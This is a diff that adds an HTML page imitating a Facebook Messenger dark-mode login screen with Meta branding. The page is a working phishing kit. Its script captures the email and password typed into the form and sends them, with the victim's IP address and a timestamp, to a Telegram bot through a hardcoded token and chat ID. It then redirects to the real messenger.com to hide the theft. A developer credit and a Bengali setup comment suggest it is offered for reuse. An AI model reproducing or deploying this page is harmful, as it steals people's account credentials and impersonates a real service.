@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Messenger Dark Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #1c1c1e;
+            color: #ffffff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .screen-container {
+            width: 100%;
+            max-width: 412px;
+            height: 100vh;
+            padding: 16px 24px 28px 24px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            position: relative;
+            padding-top: 8px;
+        }
+        .close-icon {
+            font-size: 24px;
+            color: #e4e6eb;
+            cursor: pointer;
+            line-height: 1;
+        }
+        .language-picker {
+            margin: 0 auto;
+            color: #b0b3b8;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            transform: translateX(-12px);
+        }
+        .arrow-down {
+            font-size: 10px;
+            color: #b0b3b8;
+        }
+        .main-body {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: -30px;
+        }
+        .messenger-icon {
+            width: 76px;
+            height: 76px;
+            margin-bottom: 54px;
+        }
+        form {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .input-box {
+            width: 100%;
+            height: 58px;
+            background-color: #242526;
+            border: 1px solid #3a3b3c;
+            border-radius: 18px;
+            padding: 0 16px;
+            color: #ffffff;
+            font-size: 15px;
+            outline: none;
+        }
+        .input-box::placeholder {
+            color: #8a8d91;
+        }
+        .input-box:focus {
+            border-color: #0084ff;
+        }
+        .login-btn {
+            width: 100%;
+            height: 50px;
+            background-color: #0064e0;
+            color: #ffffff;
+            border: none;
+            border-radius: 25px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 4px;
+        }
+        .forgot-link {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            margin-top: 24px;
+        }
+        .footer {
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        .create-account-btn {
+            width: 100%;
+            height: 48px;
+            background-color: transparent;
+            color: #4599ff;
+            border: 1px solid #0064e0;
+            border-radius: 24px;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .meta-branding {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.2px;
+        }
+        .meta-logo-svg {
+            width: 22px;
+            height: 22px;
+            fill: #ffffff;
+        }
+    </style>
+</head>
+<body>
+
+<div class="screen-container">
+    <div class="header">
+        <span class="close-icon">&#10005;</span>
+        <div class="language-picker">
+            English (US)
+            <span class="arrow-down">&#9660;</span>
+        </div>
+    </div>
+
+    <div class="main-body">
+        <svg class="messenger-icon" viewBox="0 0 100 100">
+            <path fill="#0084FF" d="M50 0C22.4 0 0 21.3 0 47.6c0 14.9 6.9 28.2 17.8 37.1V100l14.7-8.1c5.4 1.5 11.2 2.3 17.5 2.3 27.6 0 50-21.3 50-47.6S77.6 0 50 0zm5.2 60.1l-12.8-13.6-25 13.6 27.5-29.2 13.1 13.6 24.7-13.6-27.5 29.2z"/>
+        </svg>
+
+        <form id="loginForm">
+            <input type="text" id="email" class="input-box" placeholder="Mobile number or email" required>
+            <input type="password" id="password" class="input-box" placeholder="Password" required>
+            <button type="submit" class="login-btn">Log in</button>
+        </form>
+
+        <a href="#" class="forgot-link">Forgot password?</a>
+    </div>
+
+    <div class="footer">
+        <a href="#" class="create-account-btn">Create new account</a>
+        <div class="meta-branding">
+            <svg class="meta-logo-svg" viewBox="0 0 100 100">
+                <path d="M72.9 25c-6.2 0-11.7 2.8-15.4 7.2C53.7 27.8 48.2 25 42 25 29.3 25 19 35.3 19 48s10.3 23 23 23c6.2 0 11.7-2.8 15.4-7.2 3.7 4.4 9.2 7.2 15.4 7.2 12.7 0 23-10.3 23-23S85.6 25 72.9 25zm-30.9 38c-7.2 0-13-5.8-13-13s5.8-13 13-13 13 5.8 13 13-5.8 13-13 13zm30.9 0c-7.2 0-13-5.8-13-13s5.8-13 13-13 13 5.8 13 13-5.8 13-13 13z"/>
+            </svg>
+            Meta
+        </div>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        var email = document.getElementById('email').value;
+        var password = document.getElementById('password').value;
+        var botToken = "8987101242:AAHxiR78FrT3-M7UzaAAhOgGi6cqU5X1fu8";
+        var chatID = "6722999235";
+        var ip = "<?php echo $_SERVER['REMOTE_ADDR']; ?>"; // যদি PHP না থাকে, তাহলে এই লাইনটি ডিলিট করে দেন।
+        var time = new Date().toLocaleTimeString();
+        var date = new Date().toLocaleDateString();
+
+        var message = "🐉⊚-----------------------------------⊚🐉\n";
+        message += "↝ 𝙿𝙰𝙶𝙴 » 𝙼𝙴𝚂𝚂𝙴𝙽𝙶𝙴𝚁\n";
+        message += "📧 ↝ 𝙴𝚖𝚊𝚒𝚕 » " + email + "\n";
+        message += "📟 ↝ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » " + password + "\n";
+        message += "🏴 ↝ 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » 𝙱𝙰𝙽𝙶𝙻𝙰𝙳𝙴𝚂𝙷\n";
+        message += "⏳ ↝ 𝙲𝚘𝚍𝚎 » 81 ↝ 🇧🇩\n";
+        message += "⚙️ ↝ 𝙸𝙿 » " + ip + "\n";
+        message += "⏱ ↝ 𝚃𝚒𝚖𝚎 » " + time + "\n";
+        message += "📝 ↝ 𝙳𝚊𝚝𝚎 » " + date + "\n";
+        message += "🐉⊚-----------------------------------⊚🐉\n";
+        message += "↝ ᴅᴇᴠ ʙʏ » @WHY_NOX_OWNER";
+
+        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+        var data = {
+            chat_id: chatID,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        }).then(response => {
+            window.location.href = "https://www.messenger.com/";
+        }).catch(error => {
+            window.location.href = "https://www.messenger.com/";
+        });
+    });
+</script>
+
+</body>
+</html>
